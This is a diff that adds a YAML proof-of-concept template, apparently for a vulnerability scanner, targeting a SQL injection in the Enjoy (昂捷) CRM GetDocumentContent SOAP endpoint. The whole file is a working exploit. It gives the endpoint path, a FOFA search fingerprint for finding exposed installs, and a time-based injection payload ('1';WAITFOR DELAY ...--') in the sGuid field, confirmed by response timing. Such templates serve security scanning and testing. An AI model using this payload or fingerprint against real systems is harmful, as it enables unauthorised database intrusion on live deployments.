@@ -1,0 +1,25 @@
+id: poc-yaml-enjoyrmis-getdocumentcontent-sqli
+info:
+  name: 昂捷CRM GetDocumentContent SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: enjoyrmis
+  fofa: body="CheckSilverlightInstalled"
+variables:
+  t1: random_int(3,8)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /enjoyRMIS_WS/WS/OA/CWSOffice.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/GetDocumentContent"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetDocumentContent xmlns=\"http://tempuri.org/\">\n   \
+    \   <sGuid>1';WAITFOR DELAY '0:0:{{.t1}}'--</sGuid>\n    </GetDocumentContent>\n\
+    \  </soap:Body>\n</soap:Envelope>"
+  expression: "status_code == 200 && \ncontains(body,\"GetDocumentContentResponse\"\
+    ) &&\ncontains(content_type,\"text/xml\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
